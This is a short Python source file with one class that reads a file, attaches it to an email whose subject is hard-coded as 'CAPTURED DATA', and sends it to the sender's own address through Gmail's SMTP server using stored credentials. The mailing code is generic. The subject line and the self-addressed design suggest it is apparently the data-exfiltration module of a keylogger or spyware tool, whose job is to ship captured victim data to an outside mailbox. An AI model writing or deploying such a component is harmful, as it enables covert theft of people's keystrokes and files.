import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


class SendEmail:

    def __init__(self, path, sender=None, password=None):
        self.__subject = 'CAPTURED DATA'
        self.__sender = sender
        self.__receiver = sender
        self.__password = password
        self.__filename = path
        self.__message = MIMEMultipart()
        self.__message['From'] = sender
        self.__message['To'] = sender
        self.__message['Subject'] = self.__subject

    def send_mail(self):
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        with open(self.__filename, 'rb') as attachment:
            file = MIMEBase('application', 'octet-stream')
            file.set_payload(attachment.read())

        # Encode file in ASCII characters to send by email
        encoders.encode_base64(file)

        # Add header as key/value pair to attachment part
        file.add_header(
            'Content-Disposition',
            f'attachment; filename= {self.__filename}',
        )

        # Add attachment to message and convert message to string
        self.__message.attach(file)
        text = self.__message.as_string()

        # Creates a secure SSL context
        context = ssl.create_default_context()

        with smtplib.SMTP_SSL(
                'smtp.gmail.com', port=465,
                context=context) as server:
            server.login(self.__sender, self.__password)
            server.sendmail(self.__sender, self.__receiver, text)
